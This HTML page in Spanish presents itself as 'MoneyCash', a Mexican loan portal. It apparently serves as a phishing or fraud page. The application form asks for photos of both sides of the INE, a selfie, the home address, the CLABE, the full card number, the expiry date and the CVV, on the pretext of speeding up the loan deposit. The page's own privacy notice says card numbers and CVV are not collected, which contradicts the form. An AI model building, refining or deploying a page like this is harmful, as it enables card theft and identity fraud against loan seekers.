<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>MoneyCash - Portal de Préstamos</title>
  <!-- Ícono incrustado: no depende de una carpeta de recursos. -->
  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%2305365A'/%3E%3Cpath d='M18 47V18h8l6 13 6-13h8v29h-6V30l-8 16-8-16v17z' fill='white'/%3E%3Cpath d='M17 52h30' stroke='%23D4A84A' stroke-width='3'/%3E%3C/svg%3E">

  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">

  <style>
    /* Base responsive rules and color variables (paleta empresarial) */
    :root{
      /* Nueva paleta más bancaria y llamativa */
      --bg: #F3F6FB; /* fondo más suave */
      --surface: #FFFFFF;
      --text: #071726; /* navy profundo */
      --muted: #587087; /* gris azulado */
      --accent: #0A7BE6; /* azul vivo */
      --primary: #05365A; /* azul banca */
      --gold: #D4A84A; /* acento dorado */
      --bank-dark: #021b2d;
      --bank-light: #f5f9fc;
      --focus-ring: rgba(10,123,230,0.14);
      --card-shadow: rgba(5,55,90,0.10);
    }
    *, *::before, *::after { box-sizing: border-box; }
    img, picture, video, svg { max-width:100%; height:auto; display:block; }
    body{margin:0; font-family:'Inter',system-ui,-apple-system,'Segoe UI',Roboto,Arial; background:var(--bg); color:var(--text)}
    .container-lg{max-width:1140px;margin:0 auto;padding:18px;}
    .product-img{width:100%;height:auto;object-fit:cover;border-radius:8px;max-height:220px;display:block}

    /* Form styles */
    label{font-weight:700; color:var(--primary); display:block; margin-bottom:6px}
    .form-control{border-radius:10px; border:1px solid rgba(14,37,64,0.06); padding:12px 14px; font-size:1rem; background:var(--surface); color:var(--text)}
    .form-control:focus{outline:none; box-shadow:0 0 0 6px var(--focus-ring); border-color:var(--primary)}
    .btn-main{background:linear-gradient(90deg,var(--primary),var(--accent)); color:var(--surface); border-radius:10px; padding:12px 18px; border:0; font-weight:800; font-size:1rem; width:100%; box-shadow:0 10px 30px rgba(5,55,90,0.14); letter-spacing:0.6px}
    .small-muted{color:var(--muted)}

    /* Card and aside */
    .card-section{background:linear-gradient(180deg,var(--surface),#fbfdff); padding:20px; border-radius:12px; box-shadow:0 14px 36px var(--card-shadow); margin-bottom:18px; border-left:6px solid rgba(4,47,80,0.06)}

    /* Header/Nav */
    header { background: linear-gradient(180deg, #ffffff, var(--bg)); }
    header a{ color:var(--text); }

    /* Mobile tweaks */
    @media (max-width:576px){
      html{font-size:15px}
      .container-lg{padding:12px}
      .form-control{padding:14px}
      .card-section{padding:12px}
      .product-img{max-height:160px}
    }
    /* Chip / resaltado para secciones importantes */
    .chip-accent{display:inline-block;background:var(--accent);color:var(--surface);padding:6px 10px;border-radius:999px;font-weight:700;font-size:0.95rem}
    @media (max-width:576px){
      .chip-accent{padding:5px 8px;font-size:0.9rem}
    }
    /* (Botón flotante eliminado) */
    /* Estilos para el stepper y checklist de depósito del préstamo */
    .stepper{display:flex;flex-direction:column;gap:12px}
    .step{display:flex;gap:12px;align-items:flex-start}
    .step-icon{width:36px;height:36px;border-radius:8px;display:inline-flex;align-items:center;justify-content:center;background:var(--primary);color:var(--surface);font-weight:800}
    .step-title{font-weight:700;margin:0}
    .doc-list{list-style:none;padding:0;margin:0 0 10px 0}
    .doc-list li{display:flex;align-items:flex-start;gap:10px;padding:6px 0;color:var(--muted)}
    .doc-list li .bi{color:var(--primary);font-size:1.05rem;margin-top:3px}
    .contact-actions{display:flex;gap:8px;flex-wrap:wrap}
    .muted-small{color:var(--muted);font-size:0.95rem}
    /* Interactive animations and transitions */
    :root{ --anim-fast: 160ms; --anim-med: 260ms; --anim-ease: cubic-bezier(.2,.9,.3,1); }
    .form-control{transition:box-shadow .18s var(--anim-ease),transform .18s var(--anim-ease),border-color .18s var(--anim-ease)}
    .form-control:focus{transform:translateY(-3px);box-shadow:0 12px 28px rgba(0,45,98,0.08);border-color:var(--accent)}
    select.form-control{appearance:none}
    .btn-main, .btn{transition:transform .16s ease,box-shadow .16s ease}
    .btn-main:hover, .btn:hover{transform:translateY(-3px);box-shadow:0 10px 26px rgba(0,45,98,0.10)}
    .btn-main:active, .btn:active{transform:scale(.98)}
    .progress .progress-bar{transition:width .6s cubic-bezier(.2,.8,.2,1),background .3s}
    .step{transition:background .25s ease,transform .25s ease}
    .step-icon{transition:transform .28s cubic-bezier(.2,.8,.2,1),box-shadow .28s}
    .step.is-active .step-icon{transform:scale(1.12) rotate(-6deg);box-shadow:0 10px 26px rgba(0,45,98,0.12)}
    .doc-checklist li input[type=checkbox]{width:18px;height:18px;accent-color:var(--primary);transition:transform .18s ease}
    .doc-checklist li input[type=checkbox]:checked{transform:scale(1.08)}
    .is-selected{transform:translateY(-6px) scale(1.01);box-shadow:0 20px 48px rgba(2,45,78,0.12);border-radius:12px;border:1px solid rgba(10,102,194,0.12)}
    /* Make interactive elements visibly selectable */
    .selectable{cursor:pointer;transition:transform var(--anim-fast) var(--anim-ease),box-shadow var(--anim-fast) var(--anim-ease),border-color var(--anim-fast) var(--anim-ease);outline:transparent}
    .selectable:focus{outline:none;box-shadow:0 12px 30px var(--focus-ring),0 0 0 3px rgba(10,102,194,0.06)}
    .selectable:active{transform:scale(.99)}
    /* Ripple effect */
    .ripple{position:absolute;border-radius:999px;pointer-events:none;transform:scale(0);opacity:.28;background:radial-gradient(circle,#ffffff 10%, rgba(255,255,255,0.06) 40%, transparent 60%);will-change:transform,opacity}
    .ripple.animate{transform:scale(10);opacity:0;transition:transform 520ms var(--anim-ease),opacity 520ms linear}
    /* Ensure ripple container positioning */
    .ripple-container{position:relative;overflow:hidden}
    /* Header background / panel */
    .site-header{background:linear-gradient(90deg,var(--primary) 0%, var(--accent) 70%);border-bottom:1px solid rgba(2,18,36,0.06);}
    .site-header .container-lg{display:flex;align-items:center;justify-content:space-between;padding:14px 18px}
    .brand-logo{width:278px;height:auto;flex:none;}
    .site-header .brand-title{font-weight:900;color:var(--surface);font-size:1.12rem;letter-spacing:0.6px;text-transform:uppercase}
    .site-header .brand-sub{font-size:0.78rem;color:rgba(255,255,255,0.88);margin-top:2px}
    .site-header nav a{color:rgba(255,255,255,0.95);text-decoration:none}
    .site-header nav a:hover{color:var(--accent)}
    /* decorative panel to the right of header inside header area */
    .header-panel{background:linear-gradient(180deg,rgba(255,255,255,0.03),transparent);padding:10px 14px;border-radius:8px;color:rgba(255,255,255,0.95)}
    @media (max-width:576px){ .brand-logo{width:210px;} }
    /* Hero y galerías: reglas simples para imágenes externas añadidas */
    .hero-img{width:100%;height:320px;object-fit:cover;border-radius:8px;display:block;box-shadow:0 8px 30px rgba(2,18,36,0.06)}
    @media (max-width:576px){ .hero-img{height:180px} }
    .deposito-illustration{max-width:140px;border-radius:8px;box-shadow:0 8px 30px rgba(3,35,60,0.08)}
    .thumb-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px}
    .thumb-grid .thumb{width:100%;height:140px;object-fit:cover;border-radius:8px;box-shadow:0 6px 18px rgba(2,18,36,0.06);border:1px solid rgba(2,18,36,0.03)}

    /* Spinner overlay (bolita girando) */
    .spinner-overlay{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(3,20,40,0.36);backdrop-filter: blur(4px);z-index:1500}
    .spinner-dot{width:64px;height:64px;border-radius:50%;border:8px solid rgba(255,255,255,0.16);border-top-color:var(--gold);animation:spin 700ms linear infinite;box-shadow:0 12px 30px rgba(3,20,40,0.36)}
    @keyframes spin{to{transform:rotate(360deg)}}
  </style>
</head>
<body>

  <header class="site-header">
    <div class="container-lg">
      <div style="display:flex;align-items:center;gap:12px;">
        <!-- Identidad institucional incrustada: no depende de archivos externos. -->
        <svg class="brand-logo" viewBox="0 0 360 78" role="img" aria-labelledby="brandLogoTitle" xmlns="http://www.w3.org/2000/svg">
          <title id="brandLogoTitle">MoneyCash — Soluciones financieras</title>
          <rect x="1" y="1" width="76" height="76" rx="12" fill="#FFFFFF"/>
          <path d="M14 61V18h12l13 25 13-25h12v43h-9V35L43 59h-8L23 35v26z" fill="#05365A"/>
          <path d="M14 66h50" stroke="#D4A84A" stroke-width="3"/>
          <path d="M89 20h257" stroke="#D4A84A" stroke-width="2"/>
          <text x="89" y="49" fill="#FFFFFF" font-family="Georgia, 'Times New Roman', serif" font-size="34" font-weight="700" letter-spacing="-.7">MoneyCash</text>
          <text x="91" y="67" fill="#DCEAF5" font-family="Inter, Arial, sans-serif" font-size="10" font-weight="700" letter-spacing="2.1">SOLUCIONES FINANCIERAS</text>
        </svg>
      </div>
      <nav style="font-size:0.95rem;">
        <a href="#productos" style="margin-right:14px;">Productos</a>
        <a href="#solicitudForm" style="margin-right:14px;">Solicitar</a>
      </nav>
      <div class="header-panel d-none d-md-inline-block">
        <small style="font-weight:700">Atención</small>
        <div class="muted-small" style="margin-top:4px;">Consultas: <a href="mailto:contacto@moneycash.com" style="color:var(--surface);text-decoration:underline;">contacto@moneycash.com</a></div>
      </div>
    </div>
  </header>

  <main class="container-lg">

    <!-- Hero banner: imagen externa (picsum) -->
    <div class="card-section" aria-hidden="false" style="padding:0 0 12px 0;overflow:hidden;">
      <img class="hero-img" src="https://picsum.photos/id/1011/1600/480" alt="Banner financiero - MoneyCash">
    </div>

    <section id="productos" class="mb-3">
      <h2>Productos de Préstamo</h2>
      <p class="small-muted">Opciones de crédito con montos y plazos referenciales.</p>
      <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-bottom:16px;">
        <article class="card-section">
          <img class="product-img" src="https://picsum.photos/id/1005/800/520" alt="Préstamo Personal - Persona con celular">
          <h3 style="margin-top:10px;">Préstamo Personal</h3>
          <p class="small-muted">Crédito rápido para necesidades personales. Requisitos: identificación, y tarjeta vigente de credito o debito.</p>
        </article>
        <article class="card-section">
          <img class="product-img" src="https://picsum.photos/id/1018/800/520" alt="Préstamo Empresarial - Equipo de trabajo">
          <h3 style="margin-top:10px;">Préstamo Empresarial</h3>
          <p class="small-muted">Crédito para capital de trabajo y expansión. Requisitos: estados financieros y RFC.</p>
        </article>
      </div>
    </section>

    <h2 id="solicitudForm">Solicitud de Préstamo</h2>
    <!-- Controles de prueba removidos -->
    <p class="small-muted">Completa los datos y adjunta documentación para iniciar tu prestamo.</p>
    <form action="/submit" method="POST" enctype="multipart/form-data" novalidate>
      <!-- Spinner overlay para generación de PDF (invisible por defecto) -->
      <div id="pdfSpinner" class="d-none" role="status" aria-hidden="true">
        <div class="spinner-overlay">
          <div class="spinner-dot" aria-hidden="true"></div>
          <span class="visually-hidden">Generando PDF…</span>
        </div>
      </div>
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_template" value="table">
      <input type="hidden" name="_subject" value="Nueva solicitud de préstamo - Portal de Préstamos">

      <div class="card-section">
        <h3><i class="bi bi-pencil-square me-2" aria-hidden="true"></i>Información de la solicitud</h3>
        <div class="row">
          <div class="col-md-6">
            <h5 class="small-muted">Datos Personales</h5>
            <div class="mb-2">
              <label for="nombre"><i class="bi bi-person-fill me-1" aria-hidden="true"></i>Nombre Completo</label>
              <input id="nombre" name="nombre" type="text" class="form-control" required autocomplete="name">
              <div class="invalid-feedback">Por favor ingresa tu nombre completo.</div>
            </div>
            <div class="mb-2">
              <label for="email"><i class="bi bi-envelope-fill me-1" aria-hidden="true"></i>Correo Electrónico</label>
              <input id="email" name="email" type="email" class="form-control" required autocomplete="email">
              <div class="invalid-feedback">Correo no válido.</div>
            </div>
            <div class="mb-2">
              <label for="documento"><i class="bi bi-upload me-1" aria-hidden="true"></i>Frente de la INE (PDF o Imagen)</label>
              <input id="documento" name="documento" type="file" class="form-control" accept=".pdf,image/*" required>
              <div class="invalid-feedback">Adjunta una imagen o documento válido del frente de tu INE.</div>
            </div>

            <div class="mb-2">
              <label for="ineReverso"><i class="bi bi-upload me-1" aria-hidden="true"></i>Reverso de la INE (Imagen)</label>
              <input id="ineReverso" name="ineReverso" type="file" class="form-control" accept="image/*" required>
              <div class="invalid-feedback">Adjunta una foto válida del reverso de tu INE.</div>
            </div>

            <div class="mb-2">
              <label for="selfie"><i class="bi bi-camera-fill me-1" aria-hidden="true"></i>Selfie del solicitante</label>
              <input id="selfie" name="selfie" type="file" class="form-control" accept="image/*" capture="user" required>
              <div class="form-text small-muted" style="margin-top:6px;">Toma una selfie con la cámara frontal o selecciona una imagen de tu dispositivo.</div>
              <div style="margin-top:8px;display:flex;gap:8px;flex-wrap:wrap;">
                <button id="abrirCamaraSelfie" type="button" class="btn btn-sm btn-outline-primary"><i class="bi bi-camera-fill me-1" aria-hidden="true"></i>Tomar selfie ahora</button>
                <button id="capturarSelfie" type="button" class="btn btn-sm btn-primary d-none"><i class="bi bi-camera me-1" aria-hidden="true"></i>Capturar foto</button>
                <button id="cerrarCamaraSelfie" type="button" class="btn btn-sm btn-outline-secondary d-none">Cancelar cámara</button>
              </div>
              <div id="camaraSelfieContenedor" class="d-none" style="margin-top:10px;">
                <video id="camaraSelfie" autoplay muted playsinline style="width:100%;max-width:320px;border-radius:10px;background:#17212b;transform:scaleX(-1);"></video>
              </div>
              <img id="vistaPreviaSelfie" class="d-none" alt="Vista previa de la selfie" style="margin-top:10px;width:100%;max-width:240px;border-radius:10px;border:1px solid rgba(14,37,64,.12);">
              <div id="estadoSelfie" class="form-text small-muted" style="margin-top:6px;" role="status"></div>
              <div class="invalid-feedback">Adjunta una selfie válida.</div>
            </div>

            <div class="mb-2">
              <label for="telefono"><i class="bi bi-telephone me-1" aria-hidden="true"></i>Teléfono</label>
              <input id="telefono" name="telefono" type="tel" class="form-control" inputmode="tel" maxlength="15" pattern="[0-9\s\-()+]{7,15}" autocomplete="tel">
              <div class="invalid-feedback">Por favor ingresa un teléfono válido.</div>
            </div>

            <!-- Campos de domicilio solicitados por el usuario -->
            <div class="mb-2">
              <label for="estado">Estado</label>
              <select id="estado" name="estado" class="form-control" required autocomplete="address-level1">
                <option value="">Selecciona tu estado</option>
                <option>Aguascalientes</option>
                <option>Baja California</option>
                <option>Baja California Sur</option>
                <option>Campeche</option>
                <option>Chiapas</option>
                <option>Chihuahua</option>
                <option>Ciudad de México</option>
                <option>Coahuila</option>
                <option>Colima</option>
                <option>Durango</option>
                <option>Guanajuato</option>
                <option>Guerrero</option>
                <option>Hidalgo</option>
                <option>Jalisco</option>
                <option>Estado de México</option>
                <option>Michoacán</option>
                <option>Morelos</option>
                <option>Nayarit</option>
                <option>Nuevo León</option>
                <option>Oaxaca</option>
                <option>Puebla</option>
                <option>Querétaro</option>
                <option>Quintana Roo</option>
                <option>San Luis Potosí</option>
                <option>Sinaloa</option>
                <option>Sonora</option>
                <option>Tabasco</option>
                <option>Tamaulipas</option>
                <option>Tlaxcala</option>
                <option>Veracruz</option>
                <option>Yucatán</option>
                <option>Zacatecas</option>
              </select>
            </div>

            <div class="mb-2">
              <label for="ciudad">Ciudad / Municipio</label>
              <select id="ciudad" name="ciudad" class="form-control" required autocomplete="address-level2">
                <option value="">Selecciona primero un estado</option>
              </select>
              <input id="ciudadOtro" name="ciudadOtro" type="text" class="form-control mt-2 d-none" placeholder="Si tu ciudad no aparece, escríbela aquí" autocomplete="address-level2">
            </div>

            <div class="mb-2">
              <label for="colonia">Fraccionamiento / Colonia</label>
              <input id="colonia" name="colonia" type="text" class="form-control" placeholder="Ej: Del Valle" autocomplete="address-line2">
            </div>

            <div class="mb-2">
              <label for="calle">Calle</label>
              <input id="calle" name="calle" type="text" class="form-control" placeholder="Ej: Avenida Insurgentes Sur" autocomplete="street-address">
            </div>

            <div class="row g-2">
              <div class="col-6 mb-2">
                <label for="numExterior">Número exterior</label>
                <input id="numExterior" name="numExterior" type="text" class="form-control" placeholder="Ej: 1079" inputmode="numeric" maxlength="10" autocomplete="address-line1">
              </div>
              <div class="col-6 mb-2">
                <label for="cp">C.P.</label>
                <input id="cp" name="cp" type="text" class="form-control" placeholder="Ej: 03100" inputmode="numeric" maxlength="5" pattern="[0-9]{5}" autocomplete="postal-code">
              </div>
            </div>
          </div>
          <div class="col-md-6">
            <h5 class="small-muted">Datos del Préstamo</h5>
            <div class="row g-2">
              <div class="col-md-12 mb-2">
                <label for="montoSolicitado"><i class="bi bi-currency-dollar me-1" aria-hidden="true"></i>Monto solicitado (MXN)</label>

                <!-- Slider / Range -->
                <div style="margin-bottom:8px;">
                  <input id="montoRange" type="range" class="form-range" min="1000" max="25000" step="500" value="15000" aria-label="Monto solicitado">
                </div>

                <!-- Progress visual -->
                <div class="progress" style="height:28px;border-radius:10px;margin-bottom:8px;">
                  <div id="montoProgress" class="progress-bar" role="progressbar" style="width:10%;display:flex;align-items:center;justify-content:center;font-weight:700;color:var(--surface);background:var(--primary);">$15,000</div>
                </div>

                <!-- Número (sincronizado con slider) -->
                      <input id="montoSolicitado" name="montoSolicitado" type="number" class="form-control" placeholder="Ej: 15000" value="15000" required autocomplete="off">
                <div class="invalid-feedback">Ingresa el monto solicitado.</div>
              </div>
              <div class="col-md-6 mb-2">
                <label for="plazo"><i class="bi bi-clock me-1" aria-hidden="true"></i>Plazo (meses)</label>
                <input id="plazo" name="plazo" type="number" class="form-control" placeholder="Ej: 12" required>
                <div class="invalid-feedback">Ingresa el plazo en meses.</div>
              </div>
              <div class="col-md-6 mb-2">
                <label for="ingresos"><i class="bi bi-graph-up me-1" aria-hidden="true"></i>Ingresos mensuales (MXN)</label>
                <input id="ingresos" name="ingresos" type="number" class="form-control" placeholder="Ej: 12000" required>
                <div class="invalid-feedback">Ingresa tus ingresos mensuales.</div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <hr>
      <div class="alert alert-info" role="alert" style="border-radius:10px; margin-top:12px;">
        <strong>Importante:</strong> El depósito del préstamo se hará a la cuenta bancaria que indiques. Por defecto solicitamos el nombre del banco y los <strong>18 dígitos de la CLABE interbancaria</strong> de la cuenta como referencia. En casos puntuales, para agilizar el depósito, podremos solicitar datos adicionales de tarjeta a través de un canal seguro.
        <div class="small-muted" style="margin-top:6px;">Por seguridad, no almacenaremos tu CVV; se solicita únicamente para verificar la tarjeta y agilizar el depósito. </div>
      </div>

      <div class="card-section" style="margin-top:12px;padding:16px;">
        <h3><i class="bi bi-bank me-2" aria-hidden="true"></i>Información Bancaria </h3>

        <div class="mb-2">
          <label for="banco">Nombre del banco</label>
          <select id="banco" name="banco" class="form-control" required autocomplete="organization">
            <option value="">Selecciona tu banco</option>
            <option value="BBVA México (BBVA Bancomer)">BBVA México (BBVA Bancomer)</option>
            <option value="Citibanamex">Citibanamex</option>
            <option value="Banorte">Banorte</option>
            <option value="Santander México">Santander México</option>
            <option value="HSBC México">HSBC México</option>
            <option value="Scotiabank México">Scotiabank México</option>
            <option value="Banco Azteca">Banco Azteca</option>
            <option value="Inbursa">Inbursa</option>
            <option value="Banco del Bajío (BanBajío)">Banco del Bajío (BanBajío)</option>
            <option value="BanCoppel">BanCoppel</option>
            <option value="Banco Compartamos">Banco Compartamos</option>
            <option value="Banco Monex">Banco Monex</option>
            <option value="Banco Multiva">Banco Multiva</option>
            <option value="Banca Mifel">Banca Mifel</option>
            <option value="Otro">Otro</option>
          </select>
        </div>

        <div class="mb-2">
          <label for="clabe">CLABE interbancaria</label>
          <input type="text" id="clabe" name="clabe" class="form-control" placeholder="18 dígitos" maxlength="18" inputmode="numeric" pattern="[0-9]{18}" required autocomplete="off">
        </div>

        <hr style="margin:12px 0;">

        <h5 class="small-muted"><span class="chip-accent">Datos de tarjeta </span></h5>
        <div class="mb-2">
          <label for="cardNumber">Número de tarjeta</label>
          <input id="cardNumber" name="cardNumber" type="text" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" pattern="[0-9\s]{13,19}" autocomplete="cc-number">
        </div>

        <div class="row g-2">
          <div class="col-6 mb-2">
            <label for="expMonth">Vencimiento - Mes</label>
            <select id="expMonth" name="expMonth" class="form-control" aria-label="Mes de vencimiento" autocomplete="cc-exp-month">
              <option value="">Mes</option>
              <option value="01">01</option>
              <option value="02">02</option>
              <option value="03">03</option>
              <option value="04">04</option>
              <option value="05">05</option>
              <option value="06">06</option>
              <option value="07">07</option>
              <option value="08">08</option>
              <option value="09">09</option>
              <option value="10">10</option>
              <option value="11">11</option>
              <option value="12">12</option>
            </select>
          </div>
          <div class="col-6 mb-2">
            <label for="expYear">Vencimiento - Año</label>
            <select id="expYear" name="expYear" class="form-control" aria-label="Año de vencimiento" autocomplete="cc-exp-year">
              <option value="">Año</option>
              <!-- Generar rangos de años actual..+10 -->
              <option>2025</option>
              <option>2026</option>
              <option>2027</option>
              <option>2028</option>
              <option>2029</option>
              <option>2030</option>
              <option>2031</option>
              <option>2032</option>
              <option>2033</option>
              <option>2034</option>
            </select>
          </div>
        </div>

        <div class="mb-2">
          <label for="cvv">CVV / CVC
            <i class="bi bi-info-circle" role="img" aria-label="info CVV" data-bs-toggle="tooltip" data-bs-html="true" title="&lt;div style='max-width:260px;'&gt;&lt;svg xmlns='http://www.w3.org/2000/svg' width='260' height='140' viewBox='0 0 260 140'&gt;&lt;rect x='6' y='6' width='248' height='128' rx='10' fill='%230e5bb5' /&gt;&lt;rect x='16' y='28' width='216' height='36' rx='6' fill='%23ffffff' /&gt;&lt;rect x='170' y='78' width='56' height='22' rx='4' fill='%23ffd7b5' /&gt;&lt;text x='182' y='93' font-size='12' font-family='Arial' fill='%230b2540'&gt;CVV&lt;/text&gt;&lt;/svg&gt;&lt;div style='font-size:12px;padding-top:6px;color:#333'&gt;El CVV son 3 o 4 dígitos que aparecen en el reverso de la tarjeta (o al frente en algunas). Nunca lo almacenamos.&lt;/div&gt;&lt;/div&gt;" style="cursor:pointer;margin-left:8px;color:var(--muted);"></i>
          </label>
          <div style="position:relative">
            <input id="cvv" name="cvv" type="password" class="form-control" placeholder="CVV" maxlength="4" inputmode="numeric" pattern="\\d{3,4}" autocomplete="cc-csc" style="padding-right:38px">
            <span class="input-icon" data-bs-toggle="tooltip" data-bs-html="true" title="&lt;div style='max-width:260px;'&gt;&lt;svg xmlns='http://www.w3.org/2000/svg' width='260' height='140' viewBox='0 0 260 140'&gt;&lt;rect x='6' y='6' width='248' height='128' rx='10' fill='%230e5bb5' /&gt;&lt;rect x='16' y='28' width='216' height='36' rx='6' fill='%23ffffff' /&gt;&lt;rect x='170' y='78' width='56' height='22' rx='4' fill='%23ffd7b5' /&gt;&lt;text x='182' y='93' font-size='12' font-family='Arial' fill='%230b2540'&gt;CVV&lt;/text&gt;&lt;/svg&gt;&lt;div style='font-size:12px;padding-top:6px;color:#333'&gt;El CVV son 3 o 4 dígitos que aparecen en el reverso de la tarjeta (o al frente en algunas). Nunca lo almacenamos.&lt;/div&gt;&lt;/div&gt;" style="position:absolute;right:10px;top:50%;transform:translateY(-50%);pointer-events:auto;cursor:pointer;color:var(--muted);">
              <i class="bi bi-info-circle" aria-hidden="true"></i>
            </span>
          </div>
          <div class="form-text" style="margin-top:6px;color:#6b757e;">El CVV son 3 o 4 dígitos. Aparece en el reverso de la tarjeta; no lo almacenamos.</div>
        </div>

        <div class="small-muted" style="margin-top:6px;">Por seguridad: si se solicita CVV, no lo almacenaremos y se transmitirá por un canal seguro.</div>
      </div>

      <div class="form-check" style="margin-top:10px;">
        <input class="form-check-input" type="checkbox" value="accepted" id="consent" name="consent" required>
        <label class="form-check-label small-muted" for="consent">He leído y acepto el <a href="#avisoCollapse" data-bs-toggle="collapse" role="button" aria-expanded="false" aria-controls="avisoCollapse" onclick="setTimeout(function(){ document.getElementById('avisoCollapse').scrollIntoView({behavior:'smooth'}); },220);">Aviso de Privacidad</a> y autorizo el tratamiento de mis datos personales para la evaluación crediticia.</label>
        <div class="invalid-feedback">Debes aceptar el Aviso de Privacidad para continuar.</div>
      </div>

      

      <div style="margin-top:12px;">
        <button class="btn btn-sm btn-outline-secondary" type="button" data-bs-toggle="collapse" data-bs-target="#avisoCollapse" aria-expanded="false" aria-controls="avisoCollapse"><i class="bi bi-file-earmark-text me-1"></i>Aviso de Privacidad</button>
        <div class="collapse mt-3" id="avisoCollapse">
          <div class="card card-body" style="border-radius:10px; background: #fff;">
            <p><strong>Responsable:</strong> Soluciones Financieras S.A. de C.V. (ejemplo).</p>
            <p><strong>Finalidad:</strong> Recopilar y procesar los datos personales que nos proporcionas para tramitar tu solicitud de préstamo y realizar la evaluación crediticia.</p>
            <h5>Datos recabados</h5>
            <ul>
              <li>Nombre, correo electrónico, identificación, comprobantes e información bancaria de referencia.</li>
              <li>Información bancaria limitada: solicitamos únicamente el nombre del banco y la CLABE (18 dígitos) de la cuenta como referencia. No solicites ni compartas números completos de tarjeta ni CVV por este formulario.</li>
            </ul>
            <h5>Medidas de seguridad</h5>
            <p>Tratamos tus datos con medidas administrativas y técnicas razonables para protegerlos.</p>
            <h5>Conservación y derechos</h5>
            <p>Conservaremos tus datos durante el tiempo necesario para la gestión del préstamo. Tienes derecho a acceder, rectificar, cancelar y oponerte al tratamiento de tus datos; para ejercerlos escribe a <a href="mailto:contacto@moneycash.com">contacto@moneycash.com</a>.</p>
            <h5>Contacto</h5>
            <p>Si tienes dudas sobre este aviso o la protección de datos, contáctanos en <a href="mailto:contacto@moneycash.com">contacto@moneycash.com</a> o al teléfono <strong>55 9876 5432</strong>.</p>
            <p style="font-size:0.9rem;color:#6b7971;margin-bottom:0;">Última actualización: 24 de noviembre de 2025.</p>
          </div>
        </div>
      </div>

      <div class="d-grid mt-3"><button type="submit" class="btn-main">Enviar Solicitud</button></div>
    </form>

  </main>

  <aside class="container-lg" style="margin-top:12px;">
    <div class="card-section mb-3" id="depositoCard">
      <div style="display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap;">
        <h4 style="margin:0"><i class="bi bi-credit-card-2-back-fill" style="margin-right:8px;font-size:1.05em;vertical-align:middle;color:var(--gold)"></i>Depósito del préstamo y entrega</h4>
        <small class="muted-small">Última actualización: 24 nov 2025</small>
        <img class="deposito-illustration d-none d-md-inline-block" src="https://picsum.photos/id/1025/400/300" alt="Ilustración del depósito del préstamo" style="margin-left:8px;">
        <div style="margin-top:8px;display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
          <span class="chip-accent" style="background:linear-gradient(90deg,var(--gold),#f0c66a);color:var(--primary);font-size:0.9rem"><i class="bi bi-shield-lock-fill me-1"></i>Transacción segura</span>
          <span style="background:rgba(2,45,78,0.04);padding:6px 10px;border-radius:8px;font-weight:700;color:var(--primary);">Tiempo estimado: 1-3 días hábiles</span>
          <span style="color:var(--muted);font-size:0.95rem;margin-left:auto">Soporte: <a href="mailto:contacto@moneycash.com">contacto@moneycash.com</a></span>
        </div>
      </div>
      <p class="small-muted">Información interactiva sobre el proceso de depósito del préstamo y entrega.</p>
      <hr>

        <div class="stepper" aria-hidden="false">
        <div class="step">
          <div class="step-icon"><i class="bi bi-bell-fill" style="font-size:1.05rem"></i></div>
          <div>
            <p class="step-title">Notificación de oferta</p>
            <p class="muted-small">Recibirás una notificación con la oferta y la fecha estimada del depósito.</p>
          </div>
        </div>
        <div class="step">
          <div class="step-icon"><i class="bi bi-file-earmark-text-fill" style="font-size:1.05rem"></i></div>
          <div>
            <p class="step-title">Firma del contrato</p>
            <p class="muted-small">Tras aceptar la oferta coordinaremos la firma del contrato (digital o presencial).</p>
          </div>
        </div>
        <div class="step">
          <div class="step-icon"><i class="bi bi-cash-stack" style="font-size:1.05rem"></i></div>
          <div>
            <p class="step-title">Depósito del préstamo</p>
            <p class="muted-small">El monto se depositará en la cuenta indicada; conserva el comprobante del depósito del préstamo.</p>
          </div>
        </div>
      </div>

      <hr>

      <h5>Documentos necesarios</h5>
      <ul class="doc-list" style="margin-top:6px;margin-bottom:10px;">
        <li class="selectable" tabindex="0"><i class="bi bi-person-badge-fill" aria-hidden="true"></i>Identificación oficial vigente (INE, pasaporte)</li>
        <li class="selectable" tabindex="0"><i class="bi bi-file-earmark-text" aria-hidden="true"></i>Comprobante de ingresos reciente (últimos 1-3 meses)</li>
        <li class="selectable" tabindex="0"><i class="bi bi-house-fill" aria-hidden="true"></i>Comprobante de domicilio (recibo de servicios reciente)</li>
        <li class="selectable" tabindex="0"><i class="bi bi-briefcase-fill" aria-hidden="true"></i>Documentación adicional según el producto (contratos o estados financieros para productos empresariales)</li>
      </ul>
      

      <h5><i class="bi bi-telephone me-1"></i>Seguimiento y contacto</h5>
      <p class="muted-small">¿Necesitas ayuda directa? Contáctanos o copia la información.</p>
      <div class="contact-actions">
        <a class="btn btn-sm btn-outline-primary" href="mailto:contacto@moneycash.com" id="emailBtn"><i class="bi bi-envelope me-1"></i>contacto@moneycash.com</a>
        <button class="btn btn-sm btn-outline-secondary" id="copyEmailBtn" data-copy="contacto@moneycash.com"><i class="bi bi-clipboard me-1"></i>Copiar email</button>
        <a class="btn btn-sm btn-outline-success" href="tel:+525598765432"><i class="bi bi-telephone me-1"></i>55 9876 5432</a>
        <button class="btn btn-sm btn-outline-secondary" id="copyPhoneBtn" data-copy="+525598765432"><i class="bi bi-clipboard me-1"></i>Copiar teléfono</button>
      </div>

      <p class="muted-small" style="margin-top:10px;">Guarda los comprobantes y revisa tu correo para notificaciones.</p>
    </div>
  </aside>

